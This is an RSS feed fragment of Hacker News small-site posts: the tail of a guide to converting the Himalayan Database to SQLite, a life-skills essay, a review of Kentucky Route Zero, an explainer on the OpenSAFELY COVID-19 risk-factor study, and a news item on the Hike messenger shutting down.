    <span>main</span><span>()</span>
</code></pre><p>The database has four tables:</p>
<p><img src="http://peter-hoffmann.com/static/2021/himalayan-database-schema.png" alt=""></p>
<ul>
<li><p>The <strong>peaks</strong> table has one record fore each mountaineering peaks of Nepal</p>
</li>
<li><p>The <strong>exped</strong> table has one record describing each of the climbing expeditions.</p>
</li>
<li><p>The <strong>members</strong> table describes each of the members on the climbing team and hired personnel who were significantly involved in the expedition, one record for each member.</p>
</li>
<li><p>The <strong>refer</strong> table describes the literature references for each expedition, primarily major books, journal and magazine articles, and website links, one record for each reference.</p>
</li>
</ul>
<p>You can now use <a href="">DB Browser for SQLite</a> to inspect the data. The <a href="https://www.himalayandatabase.com/downloads/Appendix%20J%20-%20SQL%20Searches.pdf">Appendix
J: SQL Searches</a> of the Himalayan database documentation gives some ideas of
interesting queries on the data (in FoxPro SQL language). In a follow up blog
post I'm goring to describe the database schema and field contents a little
bit more into detail and also show some nice insights into historic Himalaya
expeditions.</p>
<p><img src="http://peter-hoffmann.com/static/2021/sqlitebrowser.png" alt=""></p>

        
    </div></div>]]>
            </description>
            <link>http://peter-hoffmann.com/2021/convert-the-himalayan-database-to-sqlite.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716976</guid>
            <pubDate>Sun, 10 Jan 2021 17:27:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Powerful Life Skills for the New Decade]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25716764">thread link</a>) | @neilkakkar
<br/>
January 10, 2021 | https://neilkakkar.com/powerful-life-skills.html | <a href="https://web.archive.org/web/*/https://neilkakkar.com/powerful-life-skills.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Over the past few years, I’ve noticed certain skills in people I admire, from Paul Graham, Vitalik Buterin, to Ender Wiggin.</p>

<p>These are rare skills, responsible for making them who they are. Most normal people, including me, don’t realise it. This makes the skills powerful - not everyone can see them, and very few people have mastered them.</p>

<p>However, I aim to change that. What follows below are 10 skills sourced from admirable people that I want to develop.</p>




<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>

<h2 id="learn-to-take-compounding-seriously">Learn to take compounding seriously</h2>

<p>It’s not just your wealth that compounds, but life experience and knowledge, too.</p>

<p>So, learn the most basic, most useful skills first. The longer you wait to learn skills like these, the less time there is for compounding magic. That’s what this entire list is about: powerful skills to learn and use for the rest of your life.</p>

<p>And even though you’ve heard about compounding, this item is first on the list, because <a href="https://neilkakkar.com/taking-ideas-seriously.html">taking ideas seriously is hard</a>.</p>

<p>A good way to figure out what compounds is <a href="https://neilkakkar.com/year-in-review-2019.html#compounding-is-powerful-building-intuition-for-compounding-even-more-so">to figure out what’s a platform</a>.</p>

<h2 id="learn-to-develop-taste">Learn to develop taste</h2>

<p>Despite prevalent beliefs, taste isn’t subjective.</p>

<p>While it may seem like it on the outside, when you say “I just love this painting” or “I just love this coffee machine” - all it means is that the defining characteristics are illegible to you. And noticing this is the first step.</p>

<p>Let’s take a specific example. Say you’re designing a high quality clay pot - and you’ve never done this before.</p>

<p>What’s a good way to develop taste for quality here?</p>

<p>If you’ve heard this claypot parable, you know the answer: start by making lots of crap pots.</p>

<blockquote>
  <div><p>The ceramics teacher announced on opening day that he was dividing the class into two groups. All those on the left side of the studio, he said, would be graded solely on the quantity of work they produced, all those on the right solely on its quality. His procedure was simple: on the final day of class he would bring in his bathroom scales and weigh the work of the “quantity” group: fifty pound of pots rated an “A,” forty pounds a “B,” and so on. Those being graded on “quality,” however, needed to produce only one pot—albeit a perfect one—to get an “A.”</p><p>

Well, came grading time and a curious fact emerged: the works of highest quality were all produced by the group being graded for quantity. It seems that while the “quantity” group was busily churning out piles of work—and learning from their mistakes—the “quality” group had sat theorizing about perfection, and in the end had little more to show for their efforts than grandiose theories and a pile of dead clay. - <a href="https://amzn.to/3o9o17A" target="_blank" rel="noopener">Art and Fear</a><sup id="fnref:2"><a href="#fn:2">1</a></sup></p></div>
</blockquote>

<p>Let others tell you what you’ve made is crap. Learn why. Notice when they tell you something is great. Figure out why.</p>

<p>This transfers to writing as well: Popular advice to get better is to write a lot of junk, do it a 100 times, and pay particular attention to what is received well. Here’s <a href="http://www.paulgraham.com/taste.html" target="_blank" rel="noopener">another example - developing taste for design</a>.</p>

<p>In effect, you bootstrap good taste by first learning what others consider good. Then, <a href="#learn-to-see-systems">you see the system behind it</a>. Then you break the rules and still manage to awe.</p>

<p>Then you’ve developed taste.</p>

<h2 id="learn-to-sequence-things-well">Learn to sequence things well</h2>

<p>Waking up when others are asleep and getting lots done is a super power. It’s born out of a system of <a href="https://neilkakkar.com/sequencing-things-in-the-right-order.html">learning to sequence things well</a>.</p>

<p>It means choosing the right time for that Netflix binge.</p>

<p>It means being prepared before the meeting, not scrambling to get things done after.</p>

<p>It means reading the coursebook before the lecture, not after.</p>

<h2 id="learn-to-see-what-others-see">Learn to see what others see</h2>

<p>How well can you understand other people? Can you sense their desires, their concerns, and what events lead to those desires and concerns?</p>

<p>If you can do this, you can understand them. But not before.</p>

<blockquote>
  <p>In the moment when I truly understand my enemy, understand him well enough to defeat him, then in that very moment I also love him. I think it’s impossible to really understand somebody, what they want, what they believe, and not love them the way they love themselves. - <a href="https://amzn.to/2KKe8Px" target="_blank" rel="noopener">Ender’s Game</a><sup id="fnref:1"><a href="#fn:1">2</a></sup></p>
</blockquote>

<p>It’s worth going this far because understanding is powerful. It helps you empathise. It helps you negotiate. It helps you figure out why you don’t have product-market fit. It helps you learn quickly: you can switch through personas and see what will and won’t work.</p>

<p>How do you do learn to see? I know no better way than to practice. Try it a 100 times. <a href="https://neilkakkar.com/subscribe">Come back next year</a>, and maybe I’ll have a better way once I’ve done it a 100 times.</p>

<h2 id="learn-to-make-and-execute-decisions-quickly">Learn to make and execute decisions quickly</h2>

<p>Most people have a bias towards analysis-paralysis versus getting shit done.</p>

<p>When decisions are reversible - and they mostly are - speed is a super power. Cultivating a habit of making decisions quickly, and then executing them is better than just thinking about it.</p>

<p>Training this skill begins as easily as deciding what to eat on a huge menu. It’s a small step, but over time, <a href="#learn-to-take-compounding-seriously">even the smallest steps compound</a>.</p>

<blockquote>
  <p>“Hesitation is always easy, rarely useful” - Prof. Quirrel alterego, <a href="http://www.hpmor.com/" target="_blank" rel="noopener">HPMOR</a></p>
</blockquote>

<p>Here’s an <a href="https://firstround.com/review/speed-as-a-habit/" target="_blank" rel="noopener">example in the context of business</a>. And a <a href="https://twitter.com/sama/status/1345140364995227648" target="_blank" rel="noopener">tweet from Sam Altman</a>.</p>

<h2 id="learn-to-spot-a-convex-or-concave-world">Learn to spot a convex or concave world</h2>

<p>In the world of viral infections, a 50% lockdown is worse than a 0% and a 100% lockdown, both. The virus isn’t contained, and businesses have to shut down, too.</p>

<p>In the world of immigration policies, letting some specific people in is better than letting no one or everyone in. The middle ground is better than the extremes.</p>

<p>When the best of both worlds is great, you’re in a concave disposition.</p>

<p>When the best of both worlds is worse than either, you’re in a convex disposition.</p>

<p>The world is sometimes concave, and sometimes convex. Knowing your topology can help you make better decisions.</p>

<p>I first noted this when <a href="https://vitalik.ca/general/2020/11/08/concave.html" target="_blank" rel="noopener">Vitalik Buterin explained it</a>. Read it for more concrete examples.</p>

<!-- ## Learn to do obvious things -->

<h2 id="learn-to-tell-stories">Learn to tell stories</h2>

<p>People donate more to charity when they know a single victim’s story, versus statistics of a thousand deaths. It’s called the <a href="https://en.wikipedia.org/wiki/Identifiable_victim_effect" target="_blank" rel="noopener">Identifiable Victim Effect</a>, but it’s the power of stories over facts. The right framing gets you further than all the facts combined.</p>

<blockquote>
  <p>“A single death is a tragedy; a million deaths is a statistic.”</p>
</blockquote>

<p>Ideas &amp; facts contextualised by stories are more powerful than either alone.</p>

<p><i></i><b>The Skill of Storytelling</b><br>
There’s lots to unpack here, and this is the first skill I’ve been working on for the past few months. Watch out for a long blogpost in 2 weeks!</p>

<h2 id="learn-to-dive-into-the-source-code-when-documentation-isnt-enough">Learn to dive into the source code when documentation isn’t enough</h2>

<p>Sometimes, there’s no precedent for what you want to do. Or the people who did it before didn’t write a manual.</p>

<p>In cases like these, figuring things out for yourself is powerful. Research papers and obscure books aren’t just for scientists. They’re freely available on the internet* for all of humanity to use. Learn to use it. Learn about resources like <a href="https://sci-hub.do/" target="_blank" rel="noopener">SciHub</a>, <a href="https://libgen.xyz/" target="_blank" rel="noopener">LibGen</a>, and hiring researchers. You’re allowed to hire people (specially graduate students!) to satisfy your research concerns.</p>

<p>… and when you’re done, <a href="https://neilkakkar.com/things-I-learned-to-become-a-senior-software-engineer.html#writing-code">preserve context for future you</a>.</p>

<p>It’s a lot like trying to use an API that has no documentation. Would’ve been easy if there was documentation, but there isn’t. So you got to do it the hard way: read the source code and figure out what you need to make things work.</p>

<p>It’s also like <a href="https://neilkakkar.com/A-framework-for-First-Principles-Thinking.html">figuring out what you need to build rockets yourself</a> when existing ones are too expensive.</p>

<p><a href="https://www.lesswrong.com/posts/37sHjeisS9uJufi4u/scholarship-how-to-do-it-efficiently" target="_blank" rel="noopener">More resources here</a>.</p>

<h2 id="learn-to-be-specific">Learn to be specific</h2>

<p>Every time I gave an example above, I was training my specificity muscles.</p>

<p>Most of the time, most people don’t know what they’re talking about. Not being specific is a sign of that. The more abstract the word, the harder it is to pin down a meaning.</p>

<p>For example, “negative ramifications” doesn’t tell you what exactly happened, while “the sonic boom from the new supersonic jet destroyed windows in a 100m radius” is a lot more specific.</p>

<p>Learn to be specific, and learn to spot when others aren’t. <a href="https://www.lesswrong.com/posts/NgtYDP3ZtLJaM248W/sotw-be-specific" target="_blank" rel="noopener">Here’s how</a>.</p>

<h2 id="learn-to-see-systems">Learn to see systems</h2>

<p>There’s two kinds of people.</p>

<ul>
  <li>Bob, who will see this list, find some skills very interesting, and then go about honing those skills</li>
  <li>Alice, who will see this list, and wonder how I came up with these
<!-- - The Inspiration-Junkie, who will lurk and move on to the next inspiring post without changing anything -->
</li>
</ul>

<p>Alice would then try to understand the system that generated these ideas. Then, she’ll adopt the system, and come up with skills possibly more relevant to herself.</p>

<p>Having the option to do both is powerful. Since Bob is the default, <a href="https://neilkakkar.com/How-to-see-Systems-in-everyday-life.html">learn to be like Alice</a>. Choose <a href="https://neilkakkar.com/understanding-systems.html">systems when things are important</a> to you. Choose hacks when you need a quickfix.</p>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>



    
  </div></div>]]>
            </description>
            <link>https://neilkakkar.com/powerful-life-skills.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716764</guid>
            <pubDate>Sun, 10 Jan 2021 17:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Weirdness of Kentucky Route Zero (2016)]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25716686">thread link</a>) | @olvy0
<br/>
January 10, 2021 | http://blog.joshhaas.com/2016/10/the-weirdness-of-kentucky-route-zero/ | <a href="https://web.archive.org/web/*/http://blog.joshhaas.com/2016/10/the-weirdness-of-kentucky-route-zero/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>In <a href="http://blog.joshhaas.com/2016/10/mr-robot-is-not-weird-enough/">my last post</a>, I took issue with the TV show <i>Mr. Robot</i> for not being weird enough. Although imaginative and compelling, its universe is well-ordered: everything happens for a reason.</p>
<div>

<p>If you’re looking for media to consume that doesn’t suffer from that problem, I recommend <a href="http://kentuckyroutezero.com/"><i>Kentucky Route Zero</i>.</a></p>
</div>

<p>I <a href="http://blog.joshhaas.com/2016/10/yet-another-review-of-the-trump-clinton-debate/">previously discussed</a> <i>Kentucky Route Zero</i> (<i>KR0</i> for short) in the context of the first Trump-Clinton debate. It’s relevant to that because it’s a tour through coal-country America, and it engages with the desolation there that’s fueling Trump’s support.</p>

<p>As a portrait of the region, it’s a Picasso or maybe a Goya, not a Velázquez. It has moments where it approaches documentary realism, but it mostly traverses an imaginary landscape reflecting its creators’ perceptions, inspired by their real-life travels in Kentucky.</p>

<p><i>KR0</i>’s medium is a computer game, but “game” is misleading. There’s no element of skill. It has the interface of an adventure game, but unlike other games in that genre, your progression through the story isn’t blocked by puzzles to solve. Rather, it’s more like a work of interactive fiction. The story is mainly told through dialogue, though the soundtrack and visuals are important pieces of the experience.</p>
<div>

<p>The medium is appropriate: it makes a better game than it would a book or a tv show. The ambition seems to be to create a world, and the ability to explore it freely is important. There’s a narrative, but the world is alive beyond the narrative, and there’s a lot to discover outside the main plot.</p>

</div>
<p>The three-person studio that produced <i>KR0</i>, Cardboard Computer, has been trying to erase the lines between their fictional universe and the real one. They’ve released a number of companion pieces to the game, including <a href="http://kentuckyroutezero.com/the-entertainment/">an experience for Occulus Rift or Mac / PC</a> where you participate as a cast member of a fictional 1973 production of a one-act play. The play appears to depict events that occur in a bar a few hours before the character you play in <i>KR0</i> visits the bar in the game, but the fictional set designer for the 1973 production — ie, a real person in the production’s fictional reality — is also a character in <i>KR0</i>. In case that wasn’t confusing enough, you can buy a <a href="http://www.lulu.com/shop/http://www.lulu.com/shop/lem-doolittle/the-entertainment/paperback/product-21312732.html">print copy of the script</a>, published under the name of the fictional author.</p>

<p>It’s not a bad play, either. As the script advertises, “The one-act play “A Reckoning,” set in a tavern in central Kentucky, is Doolittle’s take on the sort of barroom tragedy made popular by O’Neill, Gorky, etc.”, and I would say it stands on its own as a piece of theater, although the ending will have more resonance if you’ve played through <i>KR0</i>.</p>

<p>This almost pedantic accumulation of fictional detail, both inside and outside the game — names, biographies, places, events — lends believability and power to <i>KR0</i>’s magical realist plot-line. Because the production team took such great pains to create verisimilitude, the more fantastic elements of the game feel justified: hauntings, strange and implausible creatures, a whiskey company whose employees are all glowing skeletons, and the titular Route 0, a hidden underground highway through non-euclidean space.</p>

<p>The game’s plot is simple and unobtrusive compared to the sprawling, strange world it is set in. Conway, a truck driver for an antiques store, is trying to make a delivery to Dogwood Drive, a street that doesn’t show up on his maps. As he looks for it, he picks up some traveling companions, and we learn more about his and their pasts. <i>KR0</i> isn’t complete yet —the game is divided into five acts, and final one hasn’t been released — so I don’t know yet if Conway ever makes it to his destination.  In fact, I still don’t know what he’s delivering, or to whom.</p>

<p>As a player, the main way you exert agency is through your choice of dialogue options. Unusually for adventure-style games, your dialogue choices don’t seem to affect the plot. Rather, they affect the past: you can give the characters different backstories, influence their temperaments, change how they see the world and treat each other. It’s a limited degree of freedom: I haven’t flexed the game aggressively to see how divergent you can make it, but my understanding is that the basic outline of who the characters are always remains the same. It’s more of a matter of altering the shadings.</p>

<p>The net effect of the simple plot, the strange, expansive world, and the freedom to emphasize and explore different aspects of the characters is that playing the game doesn’t feel like you’re being told a story, with themes and a moral. Rather, it feels more like an invitation to you, the player, to interpret what you’re confronted with. The game gives you a lot of details to work with, and powerful images and emotions, but leaves you to decide what to think about it all.</p>

<p>At its heart, I think <i>Kentucky Route Zero</i> is a meditation on entropy. Certainly, entropy is the unifying characteristic of the game world. <i>KR0</i>’s setting is a Kentucky that’s been devastated by the collapse of the coal industry and by the 2008 housing crisis. Everything you encounter is in some state of falling apart. The gas station you refuel at has overdue electric bills. The bar can’t buy alcohol any more. The coal mine is abandoned. Conway’s dog looks like she’s seen better days. All the characters have various stories of poverty, alcoholism, loss, and debt.</p>

<p>Entropy has different facets. There are many different stances that one can take towards it. <i>KR0</i> seems to explore each of them in turn, weighing them, inviting you to partake.</p>

<p>The most basic stances are the emotional ones: despair, grief, and anger. There’s certainly plenty of that throughout the game. In one particularly powerful moment, you come across a memorial for coal miners who drowned when some tunnels were flooded in an accident a decade or so ago.  The memorial is a collection of hard-hats floating in an underground lake, accompanied by an angry, hand-written sign accusing the mining company of negligence. In another moment, you meet a team of engineers who spent their lives trying to build a computer system (called Xanadu, presumably a reference to the <a href="https://www.wired.com/1995/06/xanadu/">real world could-have-been internet competitor</a>), who are now just sitting around hopelessly, having given up on ever completing their lives’ work.</p>

<p>Another stance is simple momentum: keeping going on as long as you can. One character you meet is a switchboard technician, the last one on her team after all her coworkers were laid off by the phone company automating the systems. They couldn’t quite automate her, so she keeps plugging away, alone in a tunnel, connecting call after call. There’s also a church, relocated to a warehouse by some beauracrats, where the congregation all drifted away, the preacher left, and now it’s just a janitor who puts on pre-recorded sermons every Sunday.</p>

<p>Entropy and grief can also give rise to beauty. <i>KR0</i> has plenty of beautiful moments too. The game has a gorgeous soundtrack, mixing electronic music and ambience with bluegrass classics. The bluegrass pieces, performed by a mysterious wandering trio who occasionally wander across your path, are all explorations of loss and hardship, transmuted into folk songs and hymns. The visual palette of the game is mixture of blues and oranges, mostly subdued and minimalist, but occasionally spectacular. Everything has a satisfying organic, analog feel. Radio systems crackle, televisions hum, computers react to strange magnetic fluctuations.</p>

<p>Yet another approach to entropy is to consume and exploit it. At various points in the game, you encounter modern, structured institutions, that are in the process of channeling the breakdown toward their own ends. There’s a whiskey distillery that’s steadily acquiring the balance sheets and souls of the folks you meet. You get to take a tour of its expansive, industrially-clean factory in an amazing descent-into-hell sequence that feels like Dante meets OSHA. The local power company also seems to be on the march. There are also more highbrow institutions consuming the entropy. For instance, you visit the “Bureau of Reclaimed Space”, which seems to represent government, taking in weirdness and outputting paperwork. In another interlude, you find an entire town that’s been transplanted to be inside a museum, the residents still living in their houses, enclosed in a giant glass warehouse.</p>

<p>Somewhat related to high-brow consumption, there’s intellectualization of entropy. <i>KR0</i> has a steady stream of references to academia. You meet a number of characters who have spent time in the grad student / post-doc limbo space, and there’s a lot of art and math jargon. From an academic perspective, entropy is a source of phenomena to record, analyze, and write papers about — hopefully publishable ones. This content is a reflection of the game itself, which in many ways feels like a modern art project. <i>KR0</i> is obsessed with topology and imaginary spaces. Characters muse about space aloud, and as you move around the game, you explore a number of different spaces and means of navigating them: a driving map of Kentucky as navigated by truck, the same map as navigated by a bird, a bureaucratic office building where you ride an elevator up and down, a pure mathematical abstraction that you traverse by turning around at certain symbols, an endless underground river where you are swept along on a boat, among others. This self-conscious exploration invites you to see the entropy in <i>KR0’s</i> world as something to think about and study.</p>

<p>Finally, entropy gives rise to newness: the inadvertent creativity of random processes. Two of the more memorable characters you meet are a pair of androids that, in their telling, emerged from the mines as shapeless lumps, and transformed themselves into a pair of motorcycle-riding musicians, who are now <a href="https://killscreen.com/articles/kentucky-route-zeros-junebug-set-release-tktk-album-androids/">releasing an album outside the game</a>. Abandoned things in <i>KR0</i> tend to take on a life of their own.  A hobo sets up shop as an organist in a church converted into an office …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://blog.joshhaas.com/2016/10/the-weirdness-of-kentucky-route-zero/">http://blog.joshhaas.com/2016/10/the-weirdness-of-kentucky-route-zero/</a></em></p>]]>
            </description>
            <link>http://blog.joshhaas.com/2016/10/the-weirdness-of-kentucky-route-zero/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716686</guid>
            <pubDate>Sun, 10 Jan 2021 17:01:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure and blinded medical data analysis with OpenSAFELY]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25716685">thread link</a>) | @stuartbman
<br/>
January 10, 2021 | https://explainthispaper.com/identifying-covid-risk-factors-new-secure-analytics-platform/ | <a href="https://web.archive.org/web/*/https://explainthispaper.com/identifying-covid-risk-factors-new-secure-analytics-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<div>
<p><span>
<div><h3>Clinical Need</h3><p>When COVID-19 first hit, governments across the globe had to make tough public health decisions with little information. The measures they put in place to reduce spread can prevent COVID-19-related deaths but can also have <i>negative</i> consequences on physical and mental health😷.</p><p>Understanding what factors determine risk of serious outcomes from COVID-19 can help guide these policies. For example, people who are high risk may be advised to shield at home.</p><p>To understand these risk factors, there was a need to analyse large volumes of medical records. Unfortunately, getting access to these records and <sample>linking them appropriately</sample> typically requires lots of regulatory approvals and takes a long time.</p></div>
</span>
</p>
<div>

<div><p>To really understand COVID, we need to link up clinical appointment notes with test results, death records, etc.</p><p>However, this information is typically kept in different locations.</p></div>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>

</div>
</div>
</section>
<section>
<div>
<p><span>
<div><p>As a result, it’s hard to get really big datasets but <sample>the bigger, the better</sample>.</p><p>So what could we do? This research team came up with a great solution…</p></div>
</span>
</p>
<div>

<div><p>The larger the dataset, the greater statistical strength you have for the analysis.</p><p>In a smaller dataset, you might see trends - but then not have enough data to confidently say it is not due to random variation.</p><p>This is really important when looking at lots of different variables contributing to an outcome, as they did in this study.</p></div>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Chris Lovejoy</b>
</span><br>
<span>Doctor, Data Scientist</span>
</p>
</div>
</div>
</section>
<section>
<div>
<p><span>
<div><h3>What did they do?</h3><p>They assembled a team of clinicians👨‍⚕️, programmers👩‍💻, data scientists👨‍🔬 and epidemiologists🧑‍💼 and came up with a new way of extracting and analysing health data. They called this platform OpenSAFELY.</p><p>The traditional approach is to: (i) clean data and <sample>pseudonymise it</sample> (ii) download it, then (iii) run an analysis.</p></div>
</span>
</p>
<div>

<p>This is a bit like anonymisation, but not as strict. Information that could enable the individual to be identified (such as date of birth or home address) is modified, but can still be re-identified by those (ie. the researchers) using a ‘de-identification key’.</p>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Chris Lovejoy</b>
</span><br>
<span>Doctor, Data Scientist</span>
</p>
</div>
</div>
</section>
<section>
<div>
<p><span>
<div><p>However, this isn’t particularly secure (what if someone’s laptop gets stolen?), pseudonymisation isn’t fail-safe and it allows <sample>repeated analyses which risks identifying false relationships</sample>.</p><p>This team’s new approach is to upload the code for analysing the data to the electronic health record directly. The code is then run and returns the results. The data never leaves the health record. This maintains privacy and prevents repeated analyses 💯</p><p>They used this to look at the factors affecting risk of dying from COVID-19, in a GP health record dataset of 17 million individuals.</p></div>
</span>
</p>
<div>

<div><p>There’s always a possibility that patterns identified in the data are down to chance.</p><p>If a test has “95% confidence” it means there’s a 5% chance it happened by chance.</p><p>We can bear this in mind when interpreting results. However, what happens if we run multiple analyses, looking for a true result?</p><p>We give the data lots of chances to fall into that 5% that is due to chance.</p><p>With a pressure to publish interesting findings, this can incentivise researchers to run multiple tests in order to find these relationships – which may not be true. These may seem interesting, but they’re bad science.</p><p>This is known as ‘data dredging’ or ‘p-hacking’.</p></div>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Chris Lovejoy</b>
</span><br>
<span>Doctor, Data Scientist</span>
</p>
</div>
</div>
</section>
<div><h3>How does it work?</h3><p>1️⃣ First, after the researcher decides which data they want to analyse (e.g. all patients with diabetes) — they write some code to extract that from the health records.</p><p>2️⃣ When that code is run, they receive data to download. However, the data is a placeholder. It looks like the real data - but all the values are made up! Knowing the structure of the data helps the researchers write the code.</p><p>3️⃣ The working code is sent over to the health record (packaged up in a wrapper called <a href="https://www.docker.com/">Docker</a>) where it performs the analysis. Only the results are returned to the researchers - the patient data never leaves the health records. So no-one (not even the researchers) see the raw patient data.</p></div>
<div><h3>What did they find?</h3><p>They looked at data from 17 million people and found COVID-19-related death is increased by:</p><ul><li>Being male</li><li>Being older</li><li>Higher deprivation</li><li>BAME ethnicity (part of this explained by higher prevalence of medical problems and higher levels of deprivation)</li><li>Obesity</li><li>Various other medical conditions (such as diabetes, severe asthma, cancer and dementia)</li></ul></div>
<section>
<div>
<p><span>
<div><h3>Any limitations?</h3><p>This analysis was done in the early days of the pandemic. This meant we didn’t have the testing capacity we have now🧪. To circumvent this, the researchers included ‘<sample>clinically suspected’ cases</sample> of COVID-19 – and not just ones where it had been confirmed by a COVID-19 test. Some of these ‘positive’ cases may not have actually had COVID-19.</p><p>There were other common issues seen in data analysis on this scale: Some patients had missing data, like obesity, smoking status and ethnicity. Also, health record availability varies between region. They used data from a single GP electronic record company (TPP), whereas some regions (such as Scotland and North-East England use an alternative called EMIS). This means the sample population for the study may not represent the whole population (or indeed populations outside of England).</p></div>
</span>
</p>
<div>

<p>They don't include their definition here, but from the UK Government, this includes: new continuous cough or temperature ≥37.8°C or loss of, or change in, normal sense of smell (anosmia) or taste (ageusia)</p>
<p><img alt="stu.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/stu.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Stu Maitland</b>
</span><br>
<span>NIHR Doctoral Fellow</span>
</p>
</div>
</div>
</section>
<div><p>It was a great feat to get this platform up-and-running and publish the analysis in such a short space of time. This type of research doesn’t usually happen that fast.</p><p>The study helped public health teams and researchers make decisions. For example, in the UK this provided support for advising at-risk populations to shield🛡.</p><p>This also presents a new paradigm for data analysis of health data, that could enable faster, more secure and more reproducible research going forward. All the code is <a href="https://github.com/opensafely/risk-factors-research">open-source and freely available</a>. This means anybody can inspect the code and other researchers are free to use it.</p><p>Since this paper, the same research group have used this platform to look at the impact on COVID-19 risk of (i) living with school-age children, (ii) HIV, (iii) ethnicity, (iv) taking hydroxychloroquine and (v) steroids with asthma or COPD.</p></div>
</div></div>]]>
            </description>
            <link>https://explainthispaper.com/identifying-covid-risk-factors-new-secure-analytics-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716685</guid>
            <pubDate>Sun, 10 Jan 2021 17:01:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India’s own messenger, hike is shutting down]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25716681">thread link</a>) | @w3abhishek
<br/>
January 10, 2021 | https://innovativebeast.com/indias-very-own-messenger-hike-is-shutting-down/ | <a href="https://web.archive.org/web/*/https://innovativebeast.com/indias-very-own-messenger-hike-is-shutting-down/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>After WhatsApp released their new TOS and data usage policy, people debated and suggested the Signal app as a better alternative to WhatsApp. Among all these ongoing scenarios, hike messenger, which was once a top-rated messaging service in India, announced that they would shut down their services on 14th January 2020.</p>
<p>On 6 January 2021, hike messenger users received the following message:</p>
<blockquote><p>Wishing you a very Happy New Year! Today we’re announcing that after so many years of helping you deepen friendships, we will be shutting down Hike Sticker Chat at 11.59pm on 14th Jan, 2021. We thank you for creating amazing memories with us on Hike Sticker Chat and giving us your love and trust for so many years We wouldn’t be here without each and every one of you. Our Hike journey moves to 2 new exciting apps and we sincerely hope you will join us on the next chapter in our journey!</p></blockquote>
<p>As per the message, it’s clear that they are shutting hike messenger or Hike Sticker Chat on 14th January 2021. hike messenger founder <strong>Kavin Bharti Mittal</strong> tweeted about this, and one Twitter user with Twitter handle <strong>@raist99</strong> angrily asked why they are going to shut down hike messenger. <strong>Kavin Mittal</strong> replied that they are shutting down the service because not many people are using hike messenger these days.</p>
<p>Follow these tweets for the whole conversation.</p>
<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">India won’t have its own messenger. </p>
<p>Global network effects are too strong (unless India bans Western companies)<a href="https://twitter.com/telegram?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">@telegram</a> UX, Groups better than <a href="https://twitter.com/signalapp?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">@signalapp</a></p>
<p>Both are very good. As entities they have the right incentives (more aligned with consumers) unlike FB products.</p>
<p>— Kavin Bharti Mittal (@kavinbm) <a href="https://twitter.com/kavinbm/status/1348279445233168385?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 10, 2021</a></p></blockquote>

<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">Not enough people</p>
<p>— Kavin Bharti Mittal (@kavinbm) <a href="https://twitter.com/kavinbm/status/1348284754353799168?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 10, 2021</a></p></blockquote>

<p>Apart from the questions, there were suggestions. Many suggested to keep hike messenger running and use this ongoing rage against WhatsApp to capitalize and market hike as an Indian alternative to WhatsApp. Kavin responded that it’s all temporary.</p>
<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">It’ll pass. Not the first time WA screwed around with their T&amp;C.</p>
<p>— Kavin Bharti Mittal (@kavinbm) <a href="https://twitter.com/kavinbm/status/1348284485746364416?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 10, 2021</a></p></blockquote>

<h3 id="rtoc-1">Past of Hike Messenger</h3>
<p>hike messenger was one of the biggest startups back in the days. It reached a $1.4 billion valuation in less than 4 years and became the youngest successful startup and a unicorn. In August 2016, hike messenger raised $175 million from Tencent and Foxconn. Foxconn is a company that manufactures parts for Apple iPhones. According to <a href="https://www.financialexpress.com/industry/technology/100-mn-user-mark-crossed-by-hike-messenger/199703/" target="_blank" rel="noopener">Financial Times</a>, hike messenger crossed the 100 million user mark in January 2016.</p>
<p>Story by <strong>Abhishek Verma</strong>, follow him on <a href="https://twitter.com/w3Abhishek" target="_blank" rel="noopener">Twitter</a>. Thanks, <strong>Mayank Parmar</strong> for the tip, you can follow him on <a href="https://twitter.com/mayank_jee" target="_blank" rel="noopener">Twitter</a> for Windows related updates.</p>
